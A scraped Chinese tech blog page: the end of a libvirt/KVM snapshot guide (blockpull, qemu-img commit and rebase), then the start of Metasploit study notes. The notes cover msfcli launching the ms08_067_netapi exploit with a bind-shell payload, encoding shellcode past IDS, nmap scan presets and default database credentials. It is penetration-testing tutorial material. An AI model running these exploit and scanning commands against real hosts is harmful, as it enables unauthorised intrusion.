456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        2.9M -rw-------. 1 qemu qemu 3.0M Oct 11 18:10 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre></div></div>
<p>(2) 单独检查下 &#x27;Active&#x27; 所指向的backing file ::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 2.9M</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backing file: /var/lib/libvirt/images/Snap-3.qcow2</span><br></span></code></pre></div></div>
<p>(3) 开始 <strong>blockpull</strong> 操作.
::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh blockpull --domain ptest2-base --path /var/lib/libvirt/images/Active.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Block Pull: [100 %]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Pull complete</span><br></span></code></pre></div></div>
<p>(4) 再检查下快照大小， &#x27;Active&#x27;变得很大
::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        1011M -rw-------. 1 qemu qemu 3.0M Oct 11 18:29 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre></div></div>
<p>(5) 检查&#x27;Active&#x27;信息，现在它已经不需要backing file了，正如<em>Figure-6</em>所示::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 1.0G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span></code></pre></div></div>
<p>(6) 清理现场
::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span></code></pre></div></div>
<p>(7) 现在还可以使用下 guestfish  <strong>READ-ONLY</strong>  模式来检查下磁盘内容( <em>--ro</em> 选项)
::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # guestfish --ro -i -a /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre></div></div>
<p>快照删除 (and &#x27;offline commit&#x27;)</p>
<p>删除（live/offline）状态的<em>内置快照</em>很方便 ::</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain f17vm --snapshotname snap6</span><br></span></code></pre></div></div>
<p>[OR]</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete f17vm snap6</span><br></span></code></pre></div></div>
<p>libvirt现在还没有删除外置快照的功能，但是可以使用<em>qemu-img</em>命令来完成.</p>
<p>比如我们有这样一条链(VM<em>offline</em>状态): <code>base &lt;- sn1 &lt;- sn2 &lt;- sn3</code></p>
<p>现在删除第二个快照(sn2).有两种方式:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* Method (1): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Method (2): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn3)</span><br></span></code></pre></div></div>
<p>Method (1)</p>
<p>(by copying sn2 into sn1)</p>
<p>注意: 必须保证sn1没有被其他快照作为后端,不然就挂了!!</p>
<p>offline commit</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img commit sn2.qcow2</span><br></span></code></pre></div></div>
<p>将会<em>commit</em>所有在sn2中的改动到sn2的backing file(sn1).
qemu-img commit和virsh blockcommit类似
现在把sn3的后端指向到sn1.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -u -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre></div></div>
<p>注意: -u代表&#x27;Unsafe mode&#x27; -- 此模式下仅仅修改了指向到的backing file名字，必须谨慎操作.
现在可以直接删除sn2</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre></div></div>
<p>Method (2)</p>
<p>(by copying sn2 into sn3)</p>
<p>合并数据，rebase后端:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre></div></div>
<p>未使用-u模式的rebase将把数据也一并合并过去，即sn2的数据写入到sn3.
换言之: 这里使用的&#x27;Safe mode&#x27;,也是默认模式 --对sn3而言任何从
qemu-img rebase(没有-u)和和virsh blockpull类似.
backingfile（sn1）到旧的backingfile（sn2）之间发生的差异改动都将被合并到sn3中.</p>
<p>现在可以删除sn2了</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre></div></div></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/kvm">kvm</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/snapshot">snapshot</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2012/11/12/msf-study-note">metasploit学习笔记</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-12T00:00:00.000Z">2012年11月12日</time> · <!-- -->阅读需 34 分钟</div></header><div class="markdown"><blockquote>
<p>N年前使用metasploit框架过程中写下的学习笔记</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="一名词解释">一．名词解释<a href="#一名词解释" class="hash-link" aria-label="一．名词解释的直接链接" title="一．名词解释的直接链接">​</a></h2>
<ul>
<li>
<p>exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。</p>
</li>
<li>
<p>payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。</p>
</li>
<li>
<p>shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。</p>
</li>
<li>
<p>module: MSF的模块，由一系列代码组成。</p>
</li>
<li>
<p>listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="二msf基础">二．MSF基础<a href="#二msf基础" class="hash-link" aria-label="二．MSF基础的直接链接" title="二．MSF基础的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动msf">启动msf<a href="#启动msf" class="hash-link" aria-label="启动msf的直接链接" title="启动msf的直接链接">​</a></h3>
<p>1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模  式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span></code></pre></div></div>
<p>运行此命令后将进入msf命令提示符：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取帮助信息">获取帮助信息<a href="#获取帮助信息" class="hash-link" aria-label="获取帮助信息的直接链接" title="获取帮助信息的直接链接">​</a></h3>
<p>2、获取命令的帮助信息：help</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">help connect</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli">msfcli<a href="#msfcli" class="hash-link" aria-label="msfcli的直接链接" title="msfcli的直接链接">​</a></h3>
<p>3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli –h #获取帮助信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mode:H（help）帮助</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   S（summary）显示模块信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    O（options）显示模块的可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     A（advanced）  显示高级选项   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I（ids）显示IDS EVASION 选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     P（payload）显示此模块可用的payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">T（targets）显示可用targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AC（action）显示可用actions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C（check）运行模块测试</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   E（execute）执行选定的模块</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="模块使用示例">模块使用示例<a href="#模块使用示例" class="hash-link" aria-label="模块使用示例的直接链接" title="模块使用示例的直接链接">​</a></h3>
<p>例子：ms08_067_netapi模块</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi O    #查看可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="armitage使用">armitage使用<a href="#armitage使用" class="hash-link" aria-label="armitage使用的直接链接" title="armitage使用的直接链接">​</a></h3>
<p>4、Armitage <!-- -->:MSF<!-- -->的一个图形接口</p>
<p>运行方式：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/farmework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">armitage</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msf其他组件">msf其他组件<a href="#msf其他组件" class="hash-link" aria-label="msf其他组件的直接链接" title="msf其他组件的直接链接">​</a></h3>
<p>5、MSF其他组件：</p>
<ul>
<li>MSFpayload工具：</li>
</ul>
<p>用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload –h</span><br></span></code></pre></div></div>
<ul>
<li>MSFencode工具：</li>
</ul>
<p>编码压缩shellcode，过IDS ,防火墙。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfencode -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="三信息刺探与收集">三．信息刺探与收集<a href="#三信息刺探与收集" class="hash-link" aria-label="三．信息刺探与收集的直接链接" title="三．信息刺探与收集的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1攻击第一步基础信息收集">1、攻击第一步：基础信息收集<a href="#1攻击第一步基础信息收集" class="hash-link" aria-label="1、攻击第一步：基础信息收集的直接链接" title="1、攻击第一步：基础信息收集的直接链接">​</a></h3>
<p>whois查询：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf &gt; whois example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; whois 192.168.1.100</span><br></span></code></pre></div></div>
<p><a href="http://searchdns.netcraft.com/%E5%9C%A8%E7%BA%BF%E6%94%B6%E9%9B%86%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E4%BF%A1%E6%81%AF%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener noreferrer">http://searchdns.netcraft.com/在线收集服务器IP信息工具</a></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nslookup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set type=mx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; example.com</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2用nmap探测开放端口和服务">2、用nmap探测开放端口和服务：<a href="#2用nmap探测开放端口和服务" class="hash-link" aria-label="2、用nmap探测开放端口和服务：的直接链接" title="2、用nmap探测开放端口和服务：的直接链接">​</a></h3>
<p>-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn 192.168.0.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A 192.168.0.111 </span><br></span></code></pre></div></div>
<p>其他组合：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v 深入式扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v 同上，且扫UDP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -A -v -Pn 不使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn 使用ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -T4 -F 快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -T4 -O -F --version-light 加强版快速扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sn --traceroute 快速路由跟踪扫描</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 慢速全面扫描</span><br></span></code></pre></div></div>
<p>（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf与postgresql协同工作">3、MSF与postgresql协同工作<a href="#3msf与postgresql协同工作" class="hash-link" aria-label="3、MSF与postgresql协同工作的直接链接" title="3、MSF与postgresql协同工作的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/postgreql-8.3 start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 导入nmap扫描的结果：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_import Subnet1.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_hosts –c address   #查看导入的主机IP </span><br></span></code></pre></div></div>
<p>msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_driver mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql默认密码toor，使用db_connect连接时会自动创建msf3库）</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4高级扫描方式">4、高级扫描方式：<a href="#4高级扫描方式" class="hash-link" aria-label="4、高级扫描方式：的直接链接" title="4、高级扫描方式：的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>（RHOSTS、RPORT等参数也可以用小写）</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155</span><br></span></code></pre></div></div>
<p>nmap 连接数据库：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_nmap –sS –A 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; db_services  #查看扫描结果</span><br></span></code></pre></div></div>
<p>使用portscan模块：</p>
